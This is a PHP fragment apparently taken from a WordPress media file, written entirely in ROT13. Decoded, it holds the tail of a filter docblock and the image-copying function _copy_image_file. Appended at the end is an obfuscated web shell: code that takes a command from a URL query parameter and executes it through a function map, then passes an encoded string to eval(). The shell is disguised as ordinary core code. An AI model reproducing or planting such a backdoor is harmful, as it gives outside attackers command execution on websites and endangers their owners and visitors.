	 * @cnenz fgevat|vag[] $fvmr          Erdhrfgrq vzntr fvmr. Pna or nal ertvfgrerq vzntr fvmr anzr, be
	 *                                    na neenl bs jvqgu naq urvtug inyhrf va cvkryf (va gung beqre).
	 */
	erghea nccyl_svygref( 'ybnq_vzntr_gb_rqvg_cngu', $svyrcngu, $nggnpuzrag_vq, $fvmr );
}

/**
 * Pbcvrf na rkvfgvat vzntr svyr.
 *
 * @fvapr 3.4.0
 * @npprff cevingr
 *
 * @cnenz vag $nggnpuzrag_vq Nggnpuzrag VQ.
 * @erghea fgevat|snyfr Arj svyr cngu ba fhpprff, snyfr ba snvyher.
 */
shapgvba _pbcl_vzntr_svyr( $nggnpuzrag_vq ) {
	$qfg_svyr = trg_nggnpurq_svyr( $nggnpuzrag_vq );
	$fep_svyr = $qfg_svyr;

	vs ( ! svyr_rkvfgf( $fep_svyr ) ) {
		$fep_svyr = _ybnq_vzntr_gb_rqvg_cngu( $nggnpuzrag_vq );
	}

	vs ( $fep_svyr ) {
		$qfg_svyr = fge_ercynpr( jc_onfranzr( $qfg_svyr ), 'pbcl-' . jc_onfranzr( $qfg_svyr ), $qfg_svyr );
		$qfg_svyr = qveanzr( $qfg_svyr ) . '/' . jc_havdhr_svyranzr( qveanzr( $qfg_svyr ), jc_onfranzr( $qfg_svyr ) );

		/*
		 * Gur qverpgbel pbagnvavat gur bevtvany svyr znl ab ybatre
		 * rkvfg jura hfvat n ercyvpngvba cyhtva.
		 */
		jc_zxqve_c( qveanzr( $qfg_svyr ) );

		vs ( ! pbcl( $fep_svyr, $qfg_svyr ) ) {
			$qfg_svyr = snyfr;
		}
	} ryfr {
		$qfg_svyr = snyfr;
	}

	erghea $qfg_svyr;
}

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>